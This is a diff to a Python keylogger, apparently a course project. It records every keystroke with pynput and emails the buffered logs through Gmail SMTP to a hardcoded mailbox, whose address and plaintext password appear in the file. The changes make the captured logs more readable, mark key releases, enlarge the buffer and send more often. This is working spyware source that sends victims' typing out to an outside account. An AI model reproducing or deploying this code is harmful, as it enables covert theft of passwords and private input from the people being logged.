@@ -7,7 +7,7 @@ from sys import argv
 import threading
 import Queue
 destEmail = 'keylogsenderUIUC460@gmail.com'
-dataBufferSize = 100
+dataBufferSize = 500
 hackeremail = "keylogsenderUIUC460"
 hackerpwd =  "qazwsxedcrfv"
 local = False
@@ -18,7 +18,30 @@ q = Queue.Queue()
 holdDowns = ['Key.ctrl_l', 'Key.ctrl_r', 
 			 'Key.shift', 'Key.shift_r',
 			 'Key.alt_l', 'Key.alt_r']
-
+def filterKeys(letter):
+	replacements = {
+		'Key.space': ' ',
+		'Key.ctrl_l': '[CTRL_L]',
+		'Key.ctrl_r': '[CTRL_R]',
+		'Key.shift': '[SHIFT_L]',
+		'Key.shift_r': '[SHIFT_R]',
+		'Key.alt_l': '[ALT_L]',
+		'Key.alt_r': '[ALT_R]',
+		'key.caps_lock': '[CAPS_LOCK]',
+		'Key.backspace': '[BACKSPACE]',
+		'Key.enter': '[ENTER]\n',
+		'Key.esc': '[ESC]',
+		'Key.tab': '[TAB]',
+		'Key.delete': '[DEL]',
+		'Key.end': '[END]',
+		'Key.home': '[HOME]',
+		'Key.ins': '[INS]',
+		'Key.page_up': '[PAGEUP]',
+		'Key.page_down': '[PAGEDOWN]',
+		'Key.cmd': '[WINDOWSKEY]',
+		'Key.menu': '[MENU]'
+	}
+	return replacements.get(letter,letter)
 def serverSetup():
 	global hackeremail, hackerpwd
 	server = smtplib.SMTP('smtp.gmail.com', 587)
@@ -38,12 +61,15 @@ def send_data(msg):
 	except Exception as e:
 		print('Exception: ' + str(e))
 	
-def recordKey(key):
+def recordKey(key, release=False):
 		global data
 		try:
 			data += str(key.char)
 		except AttributeError:
-			data += str(key)
+			data += filterKeys(str(key))
+			print(filterKeys(str(key)))
+			if(release):
+				data+="<RELEASED>"
 		except Exception as e:
 			print('Exception: '+str(e))
 		finally:
@@ -55,14 +81,14 @@ def on_press(key):
 	print(key)
 	recordKey(key)
 
-def on_release(key):
+def on_release(key, release=True):
 	global data, end_program
 	if(key == exit_key): #exit
 		end_program = True
 		return False
 	try:
 		if(str(key) in holdDowns):
-			recordKey(key)
+			recordKey(key, release=True)
 	except Exception as e:
 		print('Exception: '+ str(e))
 
@@ -89,7 +115,7 @@ def run_sender():
 	
 	while(end_program==False):
 		try:
-			msg = q.get(block = True, timeout = 10)				
+			msg = q.get(block = True, timeout = 5)				
 		except:#queue empty 
 			continue
 		send_data(msg)
